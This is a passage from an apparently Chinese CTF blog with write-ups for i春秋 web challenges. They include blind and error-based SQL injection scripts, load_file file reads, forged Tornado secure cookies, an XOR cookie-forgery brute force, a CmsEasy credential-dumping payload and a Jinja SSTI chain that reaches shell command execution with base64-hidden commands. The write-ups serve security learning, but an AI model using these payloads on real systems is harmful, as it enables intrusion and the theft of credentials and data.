    <content><![CDATA[<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225651935.png" alt="image-20210607225651935"></p>
<p>一个登录界面既然题目叫sqli那肯定是sql</p>
<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225805955.png" alt="image-20210607225805955"></p>
<pre><code>admin%1$\' or 1=1%23</code></pre>
<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607230059922.png" alt="image-20210607230059922"></p>
<pre><code>#coding:utf-8
import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'
for i in range(30):
    key = "admin%1$\\' or " + "(length(database())=" + str(i) + ")#"
    data = {'username':key, 'password':'111'}
    r = requests.post(url, data=data).content
    if right in str(r):
        print('the length of database is %s' %i)</code></pre>
<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607224654856.png" alt="image-20210607224654856"></p>
<pre><code>import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'

database = ''
for j in range(1,4):
    for each in dic:
        key = "admin%1$\\' or " + "(ascii(substr(database(),%s,1))="%j + str(ord(each)) + ")#"
        data = {'username':key, 'password':'111'}
        r = requests.post(url, data=data).content
        print(key)
        if right in str(r):
            database += each
            print(each)
            break
print('the name of database is %s'%database)</code></pre>
<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607224940467.png" alt="image-20210607224940467"></p>
<pre><code>import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'
i = 1
while True:
    key = "admin%1$\\' or " + "(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=" + str(i) + "#"
    data = {'username':key, 'password':'111'}
    r = requests.post(url, data=data).content
    print(r)
    if right in str(r):
        print('the length of tables is %s' %i)
        break
    i += 1</code></pre>
<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225024967.png" alt="image-20210607225024967"></p>
<pre><code>import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'
table = ''
for i in range(1,5):
    for j in dic:
        key = "admin%1$\\' or " + "(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%s,1))="%i + str(ord(j)) + ")#"
        data = {'username':key, 'password':'111'}
        r = requests.post(url, data=data).content
        print(key)
        if right in str(r):
            table += j
            print(j)
            break
print('the name of table is %s'%table)</code></pre>
<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225144418.png" alt="image-20210607225144418"></p>
<pre><code>import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'
i = 1
while True:
    key = "admin%1$\\' or " + "(select length(column_name) from information_schema.columns where table_name=0x666c6167 limit 0,1)=" + str(i) + "#"
    data = {'username':key, 'password':'111'}
    r = requests.post(url, data=data).content
    print(r)
    if right in str(r):
        print('the length of columns is %s' %i)
        break
    i += 1</code></pre>
<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607225256654.png" alt="image-20210607225256654"></p>
<pre><code>import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'
for i in range(1,5):
    for j in dic:
        key = "admin%1$\\' or " + "(ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),%s,1))="%i + str(ord(j)) + ")#"
        data = {'username':key, 'password':'111'}
        r = requests.post(url, data=data).content
        print(key)
        if right in str(r):
            column += j
            print(j)
            break
print('the name of column is %s'%column)</code></pre>
<pre><code>import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'
i = 1
while True:
    key = "admin%1$\\' or " + "(select length(flag) from flag limit 0,1)=" + str(i) + "#"
    data = {'username':key, 'password':'111'}
    r = requests.post(url, data=data).content
    print(key)
    if right in str(r):
        print('the length of data is %s' %i)
        break
    i += 1</code></pre>
<pre><code>import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'
flag = ''
for i in range(1,43):
    for j in dic:
        key = "admin%1$\\' or " + "(ascii(substr((select flag from flag limit 0,1),%s,1))="%i + str(ord(j)) + ")#"
        data = {'username':key, 'password':'111'}
        r = requests.post(url, data=data).content
        print(key)
        if right in str(r):
            flag += j
            print(j)
            break
print('the flag is %s'%flag)</code></pre>
<pre><code>import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&amp;*()_+{}-="
right = 'password error!'
worry = 'username error!'
url = 'http://647d77bb3d224bd6b0e119263756c4a6dcbd242aaa264463.changame.ichunqiu.com/'
flag = ''
for i in range(1,43):
    for j in dic:
        key = "admin%1$\\' or " + "(ascii(substr((select flag from flag limit 0,1),%s,1))="%i + str(ord(j)) + ")#"
        data = {'username':key, 'password':'111'}
        r = requests.post(url, data=data).content
        print(key)
        if right in str(r):
            flag += j
            print(j)
            break
print('the flag is %s'%flag)</code></pre>
<p><img src="/2021/06/07/i-chun-qiu-web-sqli/image-20210607230115026.png" alt="image-20210607230115026"></p>
<p>参考<a href="https://blog.csdn.net/nzjdsds/article/details/82152085">https://blog.csdn.net/nzjdsds/article/details/82152085</a></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-Vld</title>
    <url>/2021/04/30/i-chun-qiu-web-vld/</url>
    <content><![CDATA[<p>扫描后台发现index.php,txt</p>
<pre><code>Finding entry points
Branch analysis from position: 0
Jump found. Position 1 = 23, Position 2 = 38
Branch analysis from position: 23
Jump found. Position 1 = 26, Position 2 = 35
Branch analysis from position: 26
Jump found. Position 1 = 29, Position 2 = 32
Branch analysis from position: 29
Jump found. Position 1 = 34
Branch analysis from position: 34
Jump found. Position 1 = 37
Branch analysis from position: 37
Jump found. Position 1 = 40
Branch analysis from position: 40
Return found
Branch analysis from position: 32
Jump found. Position 1 = 37
Branch analysis from position: 37
Branch analysis from position: 35
Jump found. Position 1 = 40
Branch analysis from position: 40
Branch analysis from position: 38
Return found
filename:       C:\ctf\index.php
function name:  (null)
number of ops:  44
compiled vars:  !0 = $a, !1 = $b, !2 = $c
line     # *  op                           fetch          ext  return  operands
---------------------------------------------------------------------------------
   2     0  &gt;   EXT_STMT
         1      ECHO                                                     'do+you+know+Vulcan+Logic+Dumper%3F%3Cbr%3E'
   3     2      EXT_STMT
         3      BEGIN_SILENCE                                    ~0
         4      FETCH_R                      global              $1      '_GET'
         5      FETCH_DIM_R                                      $2      $1, 'flag1'
         6      END_SILENCE                                              ~0
         7      ASSIGN                                                   !0, $2
   4     8      EXT_STMT
         9      BEGIN_SILENCE                                    ~4
        10      FETCH_R                      global              $5      '_GET'
        11      FETCH_DIM_R                                      $6      $5, 'flag2'
        12      END_SILENCE                                              ~4
        13      ASSIGN                                                   !1, $6
   5    14      EXT_STMT
        15      BEGIN_SILENCE                                    ~8
        16      FETCH_R                      global              $9      '_GET'
        17      FETCH_DIM_R                                      $10     $9, 'flag3'
        18      END_SILENCE                                              ~8
        19      ASSIGN                                                   !2, $10
   6    20      EXT_STMT
        21      IS_EQUAL                                         ~12     !0, 'fvhjjihfcv'
        22    &gt; JMPZ                                                     ~12, -&gt;38
   7    23  &gt;   EXT_STMT
        24      IS_EQUAL                                         ~13     !1, 'gfuyiyhioyf'
        25    &gt; JMPZ                                                     ~13, -&gt;35
   8    26  &gt;   EXT_STMT
        27      IS_EQUAL                                         ~14     !2, 'yugoiiyhi'
        28    &gt; JMPZ                                                     ~14, -&gt;32
   9    29  &gt;   EXT_STMT
        30      ECHO                                                     'the+next+step+is+xxx.zip'
  10    31    &gt; JMP                                                      -&gt;34
  11    32  &gt;   EXT_STMT
        33      ECHO                                                     'false%3Cbr%3E'
  13    34  &gt; &gt; JMP                                                      -&gt;37
  14    35  &gt;   EXT_STMT
        36      ECHO                                                     'false%3Cbr%3E'
  16    37  &gt; &gt; JMP                                                      -&gt;40
  17    38  &gt;   EXT_STMT
        39      ECHO                                                     'false%3Cbr%3E'
  19    40  &gt;   NOP
  22    41      EXT_STMT
        42      ECHO                                                     '%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A'
        43    &gt; RETURN                                                   1

branch: #  0; line:     2-    6; sop:     0; eop:    22; out1:  23; out2:  38
branch: # 23; line:     7-    7; sop:    23; eop:    25; out1:  26; out2:  35
branch: # 26; line:     8-    8; sop:    26; eop:    28; out1:  29; out2:  32
branch: # 29; line:     9-   10; sop:    29; eop:    31; out1:  34
branch: # 32; line:    11-   13; sop:    32; eop:    33; out1:  34
branch: # 34; line:    13-   13; sop:    34; eop:    34; out1:  37
branch: # 35; line:    14-   16; sop:    35; eop:    36; out1:  37
branch: # 37; line:    16-   16; sop:    37; eop:    37; out1:  40
branch: # 38; line:    17-   19; sop:    38; eop:    39; out1:  40
branch: # 40; line:    19-   22; sop:    40; eop:    43
path #1: 0, 23, 26, 29, 34, 37, 40,
path #2: 0, 23, 26, 32, 34, 37, 40,
path #3: 0, 23, 35, 37, 40,
path #4: 0, 38, 40,
do you know Vulcan Logic Dumper?&lt;br&gt;false&lt;br&gt;&lt;!-- index.php.txt ?&gt;</code></pre>
<p>为php opcodes，需要对其编译，</p>
<p>参照：<a href="https://www.cnblogs.com/wosun/p/11386434.html">https://www.cnblogs.com/wosun/p/11386434.html</a></p>
<p><img src="https://img2018.cnblogs.com/blog/1712230/201908/1712230-20190820233057014-1821050049.png" alt="img"></p>
<p>所以flag应满足三个条件：</p>
<p>然后访问1chunqiu.zip</p>
<p>其中login.php中存在注入漏洞：</p>
<pre><code>&lt;?php

require_once 'dbmysql.class.php';
require_once 'config.inc.php';

if(isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; isset($_POST['number'])){
    $db = new mysql_db();
    $username = $db-&gt;safe_data($_POST['username']);
    $password = $db-&gt;my_md5($_POST['password']);
    $number = is_numeric($_POST['number']) ? $_POST['number'] : 1;

    $username = trim(str_replace($number, '', $username));

    $sql = "select * from"."`".table_name."`"."where username="."'"."$username"."'";
    $row = $db-&gt;query($sql);
    $result = $db-&gt;fetch_array($row);
    if($row){
        if($result["number"] === $number &amp;&amp; $result["password"] === $password){
            echo "&lt;script&gt;alert('nothing here!')&lt;/script&gt;";
        }else{
            echo "&lt;script&gt;
            alert('密码错误，老司机翻车了!');
            function jumpurl(){
                location='login.html';
            }
            setTimeout('jumpurl()',1000);
            &lt;/script&gt;";
        }
    }else{
        exit(mysql_error());
    }
}else{
    echo "&lt;script&gt;
            alert('用户名密码不能为空!');
            function jumpurl(){
                location='login.html';
            }
            setTimeout('jumpurl()',1000);
        &lt;/script&gt;";
}


 ?&gt;</code></pre>
<p>其中username存在addslashes()处理（单引号，反斜杠等前面都会被加上反斜杠而转义，防御sql注入），单伤下面又存在$username = trim(str_replace($number, ‘’, $username));所以这里可以注入。</p>
<p>将number的值改为0，username的值改为%00’出现报错（%00‘ ，经过addslashes()处理后（addslashes()会在NULL前加 \ ,0等于NULL）是 \0\‘）</p>
<p>去掉0则会变成\’就让我们的单引号没有被注释</p>
<p>后台的执行语句就变成了select * from<code>users</code>where username=‘ \ ‘ ‘ 所以会报错</p>
<p>再根据1chunqiu.zip中的config.inc.php给的数据库信息一步一步报错查询下去得到flag</p>
<p><img src="https://img2018.cnblogs.com/blog/1712230/201909/1712230-20190902165656831-1580248640.png" alt="img"></p>
<pre><code>%00'and updatexml(1,substr((select flag from flag),1,41),1)#
%00'and updatexml(1,substr((select flag from flag),12,41),1)#</code></pre>
<p><img src="/2021/04/30/i-chun-qiu-web-vld/de1f20c61a02d4c5739cf5e772066e9.png" alt="de1f20c61a02d4c5739cf5e772066e9"></p>
<p><img src="/2021/04/30/i-chun-qiu-web-vld/d7b9e103ac86ed98b291be7d6cf8437.png" alt="d7b9e103ac86ed98b291be7d6cf8437"></p>
<pre><code>flag{a7758b35-61e7-484e-85f8-edffb5059625}</code></pre>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-XSS平台</title>
    <url>/2021/04/23/i-chun-qiu-web-xss-ping-tai/</url>
    <content><![CDATA[<p>构造非法参数来让网页返回错误信息</p>
<p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/%E9%9D%9E%E6%B3%95%E5%8F%82%E6%95%B0.png" alt="非法参数"></p>
<p>去GitHub搜索Rtiny，<a href="https://github.com/r0ker/Rtiny-xss%EF%BC%8C%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E4%B8%8Brtiny/lock.py%E6%96%87%E4%BB%B6">https://github.com/r0ker/Rtiny-xss，查看目录下rtiny/lock.py文件</a></p>
<p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/lockpy.png" alt="lockpy"></p>
<p>set_secure_cookie:</p>
<p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/setsecurecookie.jpg" alt="setsecurecookie"></p>
<p>cookie是被加密过的，加密使用的key在index.php文件中</p>
<p><img src="/2021/04/23/i-chun-qiu-web-xss-ping-tai/cookie.jpg" alt="cookie"></p>
<p>别人写的脚本：</p>
<pre><code>import tornado.ioloop
import tornado.web 

settings = { 
   "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",
}

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("Hello")
        self.set_secure_cookie("username", "' and 1=2 union select extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),1,25)));#")
        self.write(self.get_secure_cookie("username"))

def make_app():
    return tornado.web.Application([
        (r"/index", MainHandler),
        ], **settings)

if __name__ == "__main__":
    app = make_app()
    app.listen(8082)//防止和bp端口冲突
tornado.ioloop.IOLoop.instance().start()</code></pre>
<p>运行脚本，访问127.0.0.1:8082/index，从cookie中得到username的值，一步步注入得到ichuqiu|318a61264482e503090facfc4337207f|545 MD5解密得密码Myxss623，登录后台点File，得到提示</p>
<p>通过MYSQL函数 load_file读取，flag有点长要用mid()或者substr(),拼起来就行了</p>
<h1 id="“百度杯”CTF比赛-九月场-XSS平台"><a href="#“百度杯”CTF比赛-九月场-XSS平台" class="headerlink" title="“百度杯”CTF比赛 九月场 XSS平台"></a>“百度杯”CTF比赛 九月场 XSS平台</h1><p>登录页面，开始时尝试注入，没有明显效果，无法判断是否存在注入。</p>
<p>一时没了思路，看了大佬的 WP，发现大佬们是通过构造错误参数使得web报错，从而收集信息，算是又学习到了一招。</p>
<p>于是，在burpsuite里面构造错误参数，报错得到信息</p>
<p><img src="https://www.pianshen.com/images/701/4671cc330e1e0cf6446dfa638a58222d.png" alt="11129189-2438f0746cee3546.png"></p>
<p>image</p>
<p>报错信息中有一个rtiny</p>
<p>在<a href="https://github.com/r0ker/Rtiny-xss">github上找到相应 的项目</a></p>
<p>于是下载源码，接下来，审计：</p>
<p>在<code>rinty\lock.py</code>中有明显 的SQL注入漏洞，这里没有任何过滤。</p>
<p><img src="https://www.pianshen.com/images/71/7e462daaefe6432a134846536834bcc7.png" alt="11129189-3966ee6e7920b948.png"></p>
<p>image</p>
<p>但是下面用到一个方法，<code>set_secure_cookie</code>，在<code>index.py</code>中发现用于加密cookie的<code>cookie_secret</code>的值，于是可以构造<code>secure_cookie</code></p>
<p>所以我们只需要将自己的注入语句，使用相同的<code>cookie_secret</code>加密即可，脚本如下：</p>
<pre><code># coding:utf-8
import tornado.ioloop
import tornado.web 
settings = { 
   "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",
}
class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("Hello")
        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select version()))) -- ")
        #self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- ")
        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- ")
        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,mid((select group_concat(username,'|',password,'|',email) from manager),30,62))) -- ")
       #self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select load_file('/var/www/html/f13g_ls_here.txt'))))#")
        self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),28,60)))#")
        self.write(self.get_secure_cookie("username"))
def make_app():
    return tornado.web.Application([
        (r"/index", MainHandler),
        ], **settings)
if __name__ == "__main__":
    app = make_app()
    app.listen(8089)
    tornado.ioloop.IOLoop.instance().start()</code></pre>
<p>带上cookie（username）访问lock ，查版本测试一下：</p>
<p><img src="https://www.pianshen.com/images/262/47b409e395aaf1167db5a8f3d973023e.png" alt="11129189-718fffb67f014359.png"></p>
<p>image</p>
<p>查表名</p>
<pre><code>' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- </code></pre>
<p><img src="https://www.pianshen.com/images/218/787ebdfe8192e255861de6abb443d5c2.png" alt="11129189-35c01e3aa6c589c8.png"></p>
<p>image</p>
<p>查属性列名</p>
<pre><code>' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- </code></pre>
<p><img src="https://www.pianshen.com/images/789/267878078a2f241b36ca425a80d38bb5.png" alt="11129189-fd9af25dae3d0439.png"></p>
<p>image</p>
<p><img src="https://www.pianshen.com/images/63/b54bb500d23e6a0cf37bf9bf63b6dae7.png" alt="11129189-92983ee14280cbb0.png"></p>
<p>image</p>
<pre><code>ichuqiu|318a61264482e503090facfc4337207f|545
md5解密得到账密：ichuqiu|Myxss623</code></pre>
<p>登陆后台在File中看到提示：</p>
<p><img src="https://www.pianshen.com/images/264/2c8aa30ac8f13a68c13c7feff9d8a340.png" alt="11129189-1be8a47d8800123b.png"></p>
<p>image</p>
<p>SQL注入来<code>load_file</code></p>
<p><img src="https://www.pianshen.com/images/132/0e8c33f3cbb89db93e043655b17052cc.png" alt="11129189-9bd039e82fcc1233.png"></p>
<p>image</p>
<p>通过mid或者substr来读取完整的flag。</p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-YeserCMS</title>
    <url>/2021/04/28/i-chun-qiu-web-yesercms/</url>
    <content><![CDATA[<h2 id="判断CMS类型"><a href="#判断CMS类型" class="headerlink" title="判断CMS类型"></a>判断CMS类型</h2><h3 id="什么是CMS"><a href="#什么是CMS" class="headerlink" title="什么是CMS"></a>什么是CMS</h3><p>我们要知道，CMS代表“内容管理系统”，是一种软件工具，允许我们创建，编辑和发布内容。虽然早期的CMS软件用于管理文档和本地计算机文件，但大多数CMS系统现在专门用于管理Web上的内容。</p>
<p>内容管理系统分为四种不同类型：企业内容管理系统（ECM / ECMS），Web内容管理系统，Web组内容管理系统和组件内容管理系统。</p>
<h3 id="判断目标"><a href="#判断目标" class="headerlink" title="判断目标"></a>判断目标</h3><p>脚本语言<br>操作系统<br>搭建平台<br>CMS厂商</p>
<h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h3><p>AWVS<br>WWWSCAN<br>whatweb<br>googlehack</p>
<h2 id="YeserCMS"><a href="#YeserCMS" class="headerlink" title="YeserCMS"></a>YeserCMS</h2><ul>
<li><p>第一步,肯定是要判断出cms类型 </p>
</li>
<li><p>第二步,查询该cms曾经出现的漏洞 </p>
</li>
<li><p>第三步,然后利用这些漏洞拿到flag</p>
<p>![7cd2bb9a01f5505ad376cea92ddb627](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/7cd2bb9a01f5505ad376cea92ddb627.png)</p>
</li>
</ul>
<p>easycms建造的网站都会保留这个营销网络的界面</p>
<p>漏洞提交文档里有这样的注入方式：</p>
<pre><code>发送url:

http://localhost/Cmseasy/celive/live/header.php

postdata:

xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat%2528username%252C%2527%257C%2527%252Cpassword%2529%2529%2520from%2520cmseasy_user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;</code></pre>
<p>post里的数据有些部分进行二次url编码：解码后如下：</p>
<pre><code>xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx',
(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password))
 from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;/q&gt;&lt;/xjxquery&gt;</code></pre>
<p>将cmseasy改为yesercms， 然后注入</p>
<p><q>detail=xxxxxx’%2c%20(updatexml(1%2cconcat(0x5b%2cmid((select%2f**%2fgroup_concat(concat(username%2c’%7c’%2cpassword))%20%20from%20yesercms_user)%2c1%2c32)%2c0x5d)%2c1))%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull)–%20%3c%2fq%3e</q></p>
<p>![7870a0d75efdcc15f14357962f907bb](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/7870a0d75efdcc15f14357962f907bb.png)</p>
<p>![2a554f590ddf4312f5eaa8599b8856b](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/2a554f590ddf4312f5eaa8599b8856b.png)</p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-backdoor</title>
    <url>/2021/04/24/i-chun-qiu-web-backdoor/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-code</title>
    <url>/2021/04/22/i-chun-qiu-web-code/</url>
    <content><![CDATA[<p>访问index.php</p>
<pre><code>&lt;?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=hei.jpg');
$file = $_GET['jpg'];
echo '&lt;title&gt;file:'.$file.'&lt;/title&gt;';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
$file = str_replace("config","_", $file);
$txt = base64_encode(file_get_contents($file));

echo "&lt;img src='data:image/gif;base64,".$txt."'&gt;&lt;/img&gt;";

/*
 * Can you find the flag file?
 *
 */

?&gt;</code></pre>
<p>可以看到时PHPstorm写的</p>
<p>这个软件写的时候会生成一个.idea的文件夹，它存储了项目的配置文件，<br> 一般还存在workspace.xml，打开.idea/workspace.xml</p>
<p><img src="/2021/04/22/i-chun-qiu-web-code/idea.png" alt="idea"></p>
<pre><code>fl3gconfigichuqiu.php</code></pre>
<pre><code>&lt;?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
error_reporting(E_ALL || ~E_NOTICE);
include('config.php');
function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {
    $hash = '';
    $max = strlen($chars) - 1;
    for($i = 0; $i &lt; $length; $i++)    {
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}

function encrypt($txt,$key){
    for($i=0;$i&lt;strlen($txt);$i++){
        $tmp .= chr(ord($txt[$i])+10);
    }
    $txt = $tmp;
    $rnd=random(4);
    $key=md5($rnd.$key);
    $s=0;
    for($i=0;$i&lt;strlen($txt);$i++){
        if($s == 32) $s = 0;
        $ttmp .= $txt[$i] ^ $key[++$s];
    }
    return base64_encode($rnd.$ttmp);
}
function decrypt($txt,$key){
    $txt=base64_decode($txt);
    $rnd = substr($txt,0,4);
    $txt = substr($txt,4);
    $key=md5($rnd.$key);

    $s=0;
    for($i=0;$i&lt;strlen($txt);$i++){
        if($s == 32) $s = 0;
        $tmp .= $txt[$i]^$key[++$s];
    }
    for($i=0;$i&lt;strlen($tmp);$i++){
        $tmp1 .= chr(ord($tmp[$i])-10);
    }
    return $tmp1;
}
$username = decrypt($_COOKIE['user'],$key);
if ($username == 'system'){
    echo $flag;
}else{
    setcookie('user',encrypt('guest',$key));
    echo "â®(â¯â½â°)â­";
}
?&gt;</code></pre>
<p>别人写的脚本：</p>
<pre><code># _*_ coding: utf-8 _*
from base64 import *
import requests
import string

#设置URL
url = "http://ce4d7cd87bd0400eae49ec2fa094677525d7825dd2e64350.changame.ichunqiu.com/fl3g_ichuqiu.php"

cookie = requests.get(url).cookies['user']            #请求该URL，获取user的COOKIE值

txt = b64decode(cookie)                                #将得到的cookie进行base64解码
rnd = txt[:4]                                         #密文前四位是随机字符
tmp = txt[4:]                                        #guest与key进行异或的密文，5位
key = list('123456')                                #key为6位的字符，目前不知是啥
guest = list('guest')                                #guest明文
system = list('system')                                    

for i in range(0,len(guest)):
    guest[i] = chr(ord(guest[i]) + 10)                #为加密做准备

for i in range(0,len(guest)):
    key[i] = chr(ord(tmp[i]) ^ ord(guest[i]))        #得到key的前五位

for i in range(0,len(system)):
    system[i] = chr(ord(system[i]) + 10)            #同样是为了加密做准备

#准备爆破key的第6位
s = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"

tmp_news = ''                                        #system与key的异或值
cookie_system = []
xstr = ""

for ch in s:
    key[5] = ch
    for i in range(0,len(system)):
        tmp_news += chr(ord(system[i]) ^ ord(key[i]))
    xstr = rnd + tmp_news                            #随机字符与异或的结果拼接
    cookie_system.append(b64encode(xstr))            #base64加密，并加入到cookie_system中
    tmp_news = ""

#print(cookie_system)

for i in cookie_system:
    cookie = {'user':i.decode()}                    #设置cookie
    res = requests.get(url,cookies = cookie)        
    if "flag" in res.text:
        print res.text </code></pre>
<p><img src="/2021/04/22/i-chun-qiu-web-code/flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-fuzz</title>
    <url>/2021/05/04/i-chun-qiu-web-fuzz/</url>
    <content><![CDATA[<p>尝试到?name=123有响应</p>
<p><img src="/2021/05/04/i-chun-qiu-web-fuzz/54ac388556a196af663d2ff92856dbf.png" alt="54ac388556a196af663d2ff92856dbf"></p>
<p>尝试后发现那是python模板注入</p>
<p><img src="/2021/05/04/i-chun-qiu-web-fuzz/17e4537ea72479036d8f76a83cb2204.png" alt="17e4537ea72479036d8f76a83cb2204"></p>
<p>读版本文件：</p>
<pre><code>?name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/issue').read() }}</code></pre>
<p>向SSTI漏洞注入：</p>
<pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg',  'w').write('from subprocess import check_output\n\nRUNCMD =  check_output\n') }}  </code></pre>
<p>（这将向远程服务器写入一个文件，当编译完成为subprocess模块引入check_output方法，并将其设置指向变量RUNCMD。）</p>
<p>向config对象添加一个新项：</p>
<pre><code>?name={{ config.from_pyfile('/tmp/owned.cfg') }}</code></pre>
<p>通过向SSTI漏洞注入来检测是否成功：</p>
<pre><code>?name={{ config['RUNCMD']('/usr/bin/id',shell=True) }}</code></pre>
<p>成功返回</p>
<p><img src="/2021/05/04/i-chun-qiu-web-fuzz/b9e8213208fff1dfcab326bceae2417-1620188922808.png" alt="b9e8213208fff1dfcab326bceae2417"></p>
<p>修改引号内容为ls</p>
<p><img src="/2021/05/04/i-chun-qiu-web-fuzz/87595f52406ee2000d003adb6c40911.png" alt="87595f52406ee2000d003adb6c40911"></p>
<p>没有返回，尝试ls -al</p>
<pre><code>?name={{ config['RUNCMD']('`echo bHMgLWFsCg== | base64 -d`',shell=True) }}</code></pre>
<p><img src="/2021/05/04/i-chun-qiu-web-fuzz/ebee99c8cdefcfac602bcecda6108ad.png" alt="ebee99c8cdefcfac602bcecda6108ad"></p>
<ul>
<li>Hello total 24</li>
<li>drwx——.  2 root root 4096 May  5 03:47 .</li>
<li>drwxr-xr-x. 21 root root 4096 May  5 03:47 ..</li>
<li>-rw——-.  1 root root  165 Nov  9  2016 .bash_history</li>
<li>-rw-r–r–.  1 root root 3106 Feb 20  2014 .bashrc</li>
<li>-rw-r–r–.  1 root root   18 Nov  8  2016 .config</li>
<li>-rw-r–r–.  1 root root  140 Feb 20  2014 .profile</li>
</ul>
<p>查看var/www/html下的文件名</p>
<pre><code>?name={{ config['RUNCMD']('`echo bHMgLWFsIC92YXIvd3d3L2h0bWwK | base64 -d`',shell=True) }}</code></pre>
